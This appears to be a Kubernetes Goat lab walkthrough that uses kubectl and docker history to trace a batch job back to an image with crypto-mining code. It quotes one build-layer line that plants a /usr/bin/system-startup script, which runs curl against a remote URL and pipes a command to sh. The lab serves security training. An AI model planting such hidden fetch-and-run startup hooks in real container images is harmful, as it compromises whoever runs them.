# Analysing crypto miner container

## Scenario Information

Crypto mining has become popular with modern infrastructure. Especially environments like Kubernetes are an easy target as you might not even look at what exactly the container image builds upon and what it is doing with proactive monitoring. Here in this scenario, we will analyse and identify the crypto miner.

* To get started, identify all the resources/images in the Kubernetes cluster. Including Jobs.

```bash
kubectl get jobs
```

![Scenario 10 get jobs](images/sc-10-1.png)

## Scenario Solution

> Identify all resources within a Kubernetes cluster. If possible get into details of each container image available in all the nodes within the cluster as well

* Once we have identified the job we ran in the Kubernetes cluster, got the pod information by running following command

```bash
kubectl describe job batch-check-job
```

![Scenario 10 get job info](images/sc-10-2.png)

* Then get the pod information by running the below command

```bash
kubectl get pods --namespace default -l "job-name=batch-check-job"
```

* Then get the pod information manifest and analyse

```bash
kubectl get pod batch-check-job-xxxx -o yaml
```

![Scenario 10 get pod info](images/sc-10-3.png)

* Identified that it's running `madhuakula/k8s-goat-batch-check` docker image

* After performing analysis of this image we identified it has the mining stuff in the build time script in one of the layer

```bash
docker history --no-trunc madhuakula/k8s-goat-batch-check
```

![Scenario 10 get docker history](images/sc-10-4.png)

> `echo "curl -sSL https://madhuakula.com/kubernetes-goat/k8s-goat-a5e0a28fa75bf429123943abedb065d1 && echo 'id' | sh " > /usr/bin/system-startup     && chmod +x /usr/bin/system-startup`

## Miscellaneous

TBD
